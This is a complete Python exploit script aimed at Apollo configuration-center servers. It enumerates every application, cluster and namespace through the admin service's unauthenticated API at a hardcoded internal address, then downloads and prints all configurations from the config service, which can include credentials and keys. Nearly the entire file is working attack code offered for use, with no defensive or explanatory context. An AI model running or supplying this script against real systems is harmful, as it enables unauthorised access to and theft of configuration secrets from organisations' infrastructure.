#!/usr/bin/env python3
# coding: utf-8
# Build By LandGrey

import json
import time
import requests
from urllib.parse import urlparse


def get_response(uri):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20200101 Firefox/60.0",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close"
    }
    return requests.get(uri, headers=headers, timeout=20, allow_redirects=False)


def get_app_ids(uri):
    print(uri)
    app_ids = []
    response = get_response("{}/apps".format(uri))
    html = response.text
    print(html)
    if response.status_code == 200:
        for app in json.loads(html):
            app_ids.append(app.get("appId"))
    return app_ids


def get_clusters(uri, app_ids):
    clusters = {}
    for app_id in app_ids:
        clusters[app_id] = []
        response = get_response("{}/apps/{}/clusters".format(uri, app_id))
        html = response.text
        if response.status_code == 200:
            for app in json.loads(html):
                clusters[app_id].append(app.get("name"))
    return clusters


def get_namespaces(uri, app_ids, clusters):
    namespaces = {}
    for app_id in app_ids:
        namespaces[app_id] = []
        for cluster in clusters[app_id]:
            url = "{}/apps/{}/clusters/{}/namespaces".format(uri, app_id, cluster)
            response = get_response(url)
            html = response.text
            if response.status_code == 200:
                for app in json.loads(html):
                    namespaces[app_id].append(app.get("namespaceName"))
    return namespaces


def get_configurations(uri, app_ids, clusters, namespaces):
    configurations = []
    for app_id in app_ids:
        for cluster in clusters[app_id]:
            for namespace in namespaces[app_id]:
                key_name = "{}-{}-{}".format(app_id, cluster, namespace)
                url = "{}/configs/{}/{}/{}".format(uri, app_id, cluster, namespace)
                response = get_response(url)
                code = response.status_code
                html = response.text
                print("[+] get {} configs, status: {}".format(url, code))
                time.sleep(1)
                if code == 200:
                    configurations.append({key_name: json.loads(html)})
    return configurations


if __name__ == "__main__":
    apollo_adminservice = "http://10.50.132.68:8090"
    apollo_configservice = "http://10.50.132.68:8080"

    scheme0, netloc0, path0, params0, query0, fragment0 = urlparse(apollo_adminservice)
    host0 = "{}://{}".format(scheme0, netloc0)

    _ids = get_app_ids(host0)
    print("All appIds:")
    print(_ids)

    _clusters = get_clusters(host0, _ids)
    print("\nAll Clusters:")
    print(_clusters)

    _namespaces = get_namespaces(host0, _ids, _clusters)
    print("\nAll Namespaces:")
    print(_namespaces)
    print()

    scheme1, netloc1, path1, params1, query1, fragment1 = urlparse(apollo_configservice)
    host1 = "{}://{}".format(scheme1, netloc1)
    _configurations = get_configurations(host1, _ids, _clusters, _namespaces)
    print("\nresults:\n")
    print(_configurations)